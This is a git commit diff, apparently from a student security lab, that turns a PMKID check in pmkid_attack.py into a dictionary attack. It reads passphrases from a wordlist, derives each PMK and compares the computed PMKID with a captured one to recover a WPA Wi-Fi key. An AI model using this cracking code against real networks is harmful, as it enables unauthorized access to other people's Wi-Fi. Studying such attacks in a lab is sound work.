230e58adac82927b3c6a42e924dea8f2b6acfce9
Christoph Rueff <christoph.rueff@gmail.com>
2020-05-02 12:12:03 +0200

    Add password research in wordlist

--- files/pmkid_attack.py
+++ files/pmkid_attack.py
@@ -14,14 +14,23 @@ APmac       = a2b_hex(packets[145].addr3.replace(':',''))
 Clientmac   = a2b_hex(packets[145].addr1.replace(':',''))
 pmkid       = a2b_hex("7fd0bc061552217e942d19c6686f1598")[:6]
 
-passPhrase = "admin123"
+# read wordlist line by line
+with open('wordlist.txt') as fp:
+    passPhrase = fp.readline()[:-1]
+    found = False
+    while passPhrase:
+        pp_encoded = str.encode(passPhrase)
+        # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+        pmk = pbkdf2(hashlib.sha1, str.encode(passPhrase), str.encode(ssid), 4096, 32)
+        # compute the PMKID with the tested passphrase
+        computed_pmkid = hmac.new(pmk,str.encode("PMK Name")+APmac+Clientmac,hashlib.sha1).digest()[:6]
 
-pmk = pbkdf2(hashlib.sha1, str.encode(passPhrase), str.encode(ssid), 4096, 32)
+        # compare the PMKIDs
+        if b2a_hex(pmkid) == b2a_hex(computed_pmkid):
+            found = True
+            print("The key was found ! It is : ", passPhrase)
 
-computed_pmkid = hmac.new(pmk,str.encode("PMK Name")+APmac+Clientmac,hashlib.sha1).digest()[:6]
-
-print("real pmkid : ", b2a_hex(pmkid))
-print("computed pmkid : ", b2a_hex(computed_pmkid))
-
-if b2a_hex(pmkid) == b2a_hex(computed_pmkid):
-    print("The key was found ! It is : ", passPhrase)
+        passPhrase = fp.readline()[:-1]
+    
+    if not found:
+        print("pass phrase not in the list.")
